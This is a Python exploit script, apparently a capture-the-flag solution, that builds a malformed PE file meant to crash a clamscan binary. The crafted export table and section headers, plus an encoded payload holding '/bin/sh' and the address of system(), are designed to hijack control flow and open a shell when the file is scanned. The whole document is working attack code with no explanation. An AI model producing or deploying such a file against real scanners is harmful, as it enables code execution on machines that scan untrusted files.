from ptrlib import *

elf = ELF("share/clamscan")

num_sections = 2

pe  = b''
# DOS Header
pe += b'MZ\0\0'
pe += b'\0' * 0x38
pe += p32(0x40) # pointer to pe header
# COFF header
pe += b'PE\0\0'
pe += p16(0) # machine
pe += p16(num_sections) # [!] number of sections
pe += p32(0) # time date stamp
pe += p32(0) # pointer to symbol table
pe += p32(0) # number of symbol table
pe += p16(0xe0) # size of optional header
pe += p16(2) # characteristics
# Standard COFF header
pe += p16(0x010b) # magic
pe += p16(0) # version
pe += p32(0) # size of code
pe += p32(0) # size of initialized data
pe += p32(0) # size of uninitialized data
pe += p32(0x5000) # address of entry point
pe += p32(0) # base of code (RVA)
pe += p32(0) # base of data (RVA)
pe += p32(0xcafe0000) # image base
pe += p32(0x1000) # section alignment
pe += p32(0x200) # file alignment
pe += p16(0) * 6 # version
pe += p32(0) # win32 version value
pe += p32(0x1000) # size of image
pe += p32(0) # size of headers
pe += p32(0) # size checksum
pe += p16(3) # subsystem
pe += p16(0) # dll characteristics
pe += p32(1) # size of stack reserve
pe += p32(2) # size of stack commit
pe += p32(3) # size of heap reserve
pe += p32(4) # size of heap commit
pe += p32(0) # loader flags
pe += p32(0x10) # number of rva and sizes
pe += p32(0x400) # [!] export table
pe += p32(0x100) # [!] size of export table
pe += p32(0) # import table
pe += p32(0) # size of import table
pe += p32(0) * 28
# section 1
pe += b'.AAAA\0\0\0'
pe += p32(0x1000) # vsize
pe += p32(0x4000) # vaddr
pe += p32(0x100)  # size of raw data
pe += p32(0x400)  # pointer to raw data
pe += p32(0) # pointer to relocations
pe += p32(0) # pointer to linenumbers
pe += p16(0) * 2
pe += p32(0) # characteristics
# section 2
pe += b'.BBBB\0\0\0'
pe += p32(0x1000) # vsize
pe += p32(0x5000) # vaddr
pe += p32(0x5000) # size of raw data
pe += p32(0x600)  # pointer to raw data
pe += p32(0) # pointer to relocations
pe += p32(0) # pointer to linenumbers
pe += p16(0) * 2
pe += p32(0) # characteristics
pe += b'\x00' * (0x400 - len(pe))
# block for section 1 (packed data)
pe += b'C' * (0x600 - len(pe))
# block for section 2 (entry point)
pe += b'\xb8'
pe += p32(0xcafe5000)
pe += b'A' * (0x1b8 - 5)

size = 0x40

pe += p32(0x5300) # srva (src)
pe += p32(size) # size
pe += p32(0x90) # thisrva (dsst) #### change here
pe += p32(0xdeadbeef)
pe += p32(0)
pe += p32(0)
pe += p32(0)
pe += b'B' * (0x900 - len(pe))
# data: 000000423090

def encode(data, size):
    output = b''
    i = 0
    for c in data:
        if i == 0:
            output += bytes([ c ])
        else:
            output += bytes([ c ^ (size & 0xff) ])
        if i % 8 == 0:
            output += bytes([0])
        i += 1
        size -= 1
    return output

data  = b'/bin/sh\0'
data += p64(elf.plt("system"))
data *= (size // 0x10)
pe += encode(data, size)
pe += b'B' * (0x2000 - len(pe))

print(len(pe))
with open("sample.exe", "wb") as f:
    f.write(pe)
